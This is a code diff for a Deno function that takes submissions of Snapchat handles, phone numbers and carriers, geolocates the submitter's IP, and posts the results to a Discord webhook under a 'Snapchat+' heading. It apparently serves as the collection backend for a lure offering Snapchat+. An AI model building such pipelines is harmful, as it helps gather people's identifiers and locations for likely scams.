@@ -3,10 +3,16 @@ import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';
 const DISCORD_WEBHOOK = Deno.env.get("DISCORD_WEBHOOK");
 
 Deno.serve(async (req) => {
-  try {
-    const base44 = createClientFromRequest(req);
-    const body = await req.json();
-    const { snapchat, telephone, operateur, submissionId } = body;
+  const authHeader = req.headers.get("authorization") || "";
+  const token = authHeader.replace("Bearer ", "");
+  const expectedToken = Deno.env.get("WEBHOOK_SECRET");
+  if (expectedToken && token !== expectedToken) {
+    return Response.json({ error: "Unauthorized" }, { status: 401 });
+  }
+
+  const base44 = createClientFromRequest(req);
+  const body = await req.json();
+  const { snapchat, telephone, operateur, submissionId } = body;
 
   const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
   const formatPhoneRaw = (tel) => tel.replace(/\D/g, '').slice(-10);
@@ -44,22 +50,14 @@ Deno.serve(async (req) => {
   const blacklistPayload = btoa(JSON.stringify({ ip, telephone, submissionId }));
   const blacklistUrl = `${appUrl}/api/blacklist?data=${blacklistPayload}`;
 
-  let country = "France";
-  let city = "Inconnue";
-  
-  if (ip && ip !== "Inconnue") {
-    try {
-      const apiKey = Deno.env.get("IPQUALITYSCORE_KEY");
-      const geoResponse = await fetch(`https://ipqualityscore.com/api/json/ip/${ip}?apikey=${apiKey}`);
-      if (geoResponse.ok) {
-        const geoData = await geoResponse.json();
-        country = geoData.country_name || "France";
-        city = geoData.city || "Inconnue";
-      }
-    } catch (e) {
-      // Fallback to defaults
-    }
+  const geoResponse = await fetch("https://ipapi.co/" + ip + "/json/").catch(() => null);
+  let geoData = { country_name: "France", city: "Inconnue" };
+  if (geoResponse?.ok) {
+    geoData = await geoResponse.json();
   }
+
+  const country = geoData.country_name || "France";
+  const city = geoData.city || "Inconnue";
 
   const embed = {
     title: "📱 Nouvelle soumission Snapchat+",
@@ -98,7 +96,4 @@ Deno.serve(async (req) => {
   });
 
   return Response.json({ ok: true });
-  } catch (error) {
-    return Response.json({ error: error.message }, { status: 500 });
-  }
 });
